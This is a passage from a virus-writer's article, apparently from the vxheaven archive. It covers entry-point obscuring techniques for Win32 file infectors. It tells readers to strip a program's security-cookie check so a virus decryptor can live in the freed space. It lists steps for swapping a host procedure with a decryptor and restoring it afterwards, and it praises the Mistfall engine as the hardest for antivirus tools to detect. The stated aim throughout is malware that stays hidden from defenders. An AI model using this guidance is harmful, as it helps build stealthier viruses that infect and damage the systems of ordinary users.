<span style="color: #adadad; font-style: italic;">01856177</span> |<span style="color: #339933;">.</span> C9&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">LEAVE</span><br/>
<span style="color: #adadad; font-style: italic;">01856178</span> \<span style="color: #339933;">.</span> C3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RETN<br/>
&nbsp;</div>
<p>This code is the code of a procedure named Security check cookie. This benefit of this procedure is if you remove it the program will run smoothly with no problem and the functionality of the program will not changed only you will open a security threat in this part of code</p>
<p>You can easily search for this Procedure and search for all calls to it and remove them and this piece of code will be just for your use</p>
<p>You can write your decryptor on it or you can merge it with the previous procedure and make it as a huge cavity. Or at least you can it as a place for subroutines for the next idea or divide your decryptor into 2 places like One_half</p>
<p>The usage is up to you and this is just an example of this idea and I think you will find more and more ideas if you jump for researching. Now let's jump to the next</p>
<h2><a name="c5"></a>5. Dynamic Blocks of Code EPO</h2>
<p>This me this idea is not a new idea it's a known idea but rarely used. This idea is win32.SK idea and I think it's only used in 3 viruses even it invented from the DOS time.</p>
<p>This idea is simply replacing a procedure in the host with a decryptor for your virus. In this Idea you will need to have a disassemble like hde32 to disassemble the procedure to reach the end of the procedure</p>
<p>The Steps to use this idea is:</p>
<ol>
<li>search for a call to push ebp/mov ebp,esp</li>
<li>begin disassembling from push ebp until find leave/ret or pop ebp/ret</li>
<li>copy this proc to the end of the virus and replace it with a decryptor for yours</li>
<li>when the virus return to the host it should put the real proc again and jump to it and don't forget to reset all changes your virus do with the stack (especially if you use multi-layer poly)</li>
</ol>
<p>This idea is easy and very powerful but I'll not describe many because it's a known idea and you can take my virus as example win32.skipo it's commented not like win32.sk</p>
<h2><a name="c6"></a>6. Mistfall EPO</h2>
<p>That's the last EPO I have in my bag. I decide to write it at the end because it's the best of the best. It's really hard to program so it's only one of Mistfall in the world.</p>
<p>This engine simply disassemble everything in the program convert it into the smallest pieces make it easy to eat and easy to control. This idea is really hard to detect but not easy to infect I think it's the hardest to program.</p>
<p>I'll not describe it because I'm sure you know it very well and you will see a describe of it in 29A#6 or 29A#5</p>
<h2><a name="c7"></a>7. Conclusion</h2>
<p>I think I reach the end of EPO and still one question: What should I choose? You should choose first your mind and your creativity searching for an EPO that impossible to reverse. EPO you can easily program it but hard for avers to detect it and hard to find the entrypoint of you virus. If they didn't find it your virus will become totally hidden and very hard to detect.</p>
<p>I hope you enjoy my article and Enjoy EPO. I hope I inspire you with my words.</p>
<p>See you next time and … Bye</p>
<p>Tiberio Degano</p>
[<a style="" href="/lib/?lang=EN&amp;index=VT#vtd00">Back to index</a>] [<a href="/lib/vtd00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vtd00">de</a><a href="/lib/index.php?lang=en&amp;id=vtd00">en</a><a href="/lib/index.php?lang=es&amp;id=vtd00">es</a><a href="/lib/index.php?lang=it&amp;id=vtd00">it</a><a href="/lib/index.php?lang=fr&amp;id=vtd00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vtd00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vtd00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vtd00">ua</a></div>
</body>
</html>
